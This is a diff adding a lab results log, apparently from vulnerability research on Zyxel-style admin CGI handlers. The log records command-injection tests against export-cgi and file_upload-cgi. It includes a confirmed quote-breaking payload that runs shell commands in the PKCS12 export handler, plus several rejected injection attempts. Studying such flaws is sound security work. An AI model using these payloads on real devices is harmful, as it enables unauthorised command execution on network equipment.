@@ -1,0 +1,51 @@
+result_class=admin_web_handler_focus
+date=2026-04-22
+export_config_plain_http=200
+export_pkcs12_plain_http=
+export_pkcs12_semicolon_control_http=
+export_pkcs12_quote_inject_http=200
+export_pkcs12_semicolon_marker=no
+export_pkcs12_quote_marker=yes
+export_pkcs12_quote_uid0=no
+upload_config_plain_http=200
+upload_config_filename_inject_http=200
+upload_script_filename_inject_http=200
+upload_certlocal_plain_http=200
+upload_certlocal_ci_pw_inject_http=200
+
+[export-cgi]
+- the corrected admin-cookie HTTP PKCS12 payload is now confirmed live on this seam:
+  - request shape: `arg1=x";id;echo HTTP_EXPORT_MARKER;#`
+  - response: `HTTP 200`
+  - body begins with `uid=1000 ...` and `HTTP_EXPORT_MARKER`, then the attachment headers and PKCS12 blob
+- the earlier semicolon-only control stayed empty and did not produce the marker:
+  - request shape: `arg1=testpass;id;echo HTTP_EXPORT_MARKER`
+  - result: curl timeout with zero body bytes and no headers
+- plain admin-tagged config export still works and returns the real startup-config body
+- plain admin-tagged PKCS12 export remained unstable on this exact lane and timed out with zero bytes; do not use that timeout to downgrade the quote-based HTTP injection confirmation
+
+[file_upload-cgi]
+- plain admin config upload still works and creates `db/etc/zyxel/ftp/conf/sample.conf`
+- filename-injection tests on `config` and `script` do not show command execution:
+  - both requests return `HTTP 200`
+  - both bodies collapse to `Warning ULCGI unalbe to parse CGI query!`
+  - no marker file is created anywhere under the tracked runroot
+- the `certlocal` password-injection test also does not promote:
+  - crafted `ci_pw=$(touch${IFS}ADMIN_WEB_CERT_MARKER)` is rejected as `Invalid character for password`
+  - no marker file is created
+
+[execution-context]
+- the observed `uid=1000` on this host should be interpreted as a lab artifact, not as a device-side privilege ceiling:
+  - this extracted workspace runs `lighttpd`, `export-cgi`, and `file_upload-cgi` as user-owned files (`766 ubuntu ubuntu`)
+  - the important web-lane result here is that the corrected quote-breaking payload survives real HTTP dispatch and executes shell syntax in the CGI context
+
+[artifacts]
+- `export_pkcs12_quote_inject.headers.txt`
+- `export_pkcs12_quote_inject.body.bin`
+- `export_pkcs12_semicolon_control.headers.txt`
+- `export_pkcs12_semicolon_control.body.bin`
+- `upload_config_filename_inject.body.bin`
+- `upload_script_filename_inject.body.bin`
+- `upload_certlocal_ci_pw_inject.body.bin`
+- `manifest.diff.txt`
+- `marker_hits.txt`
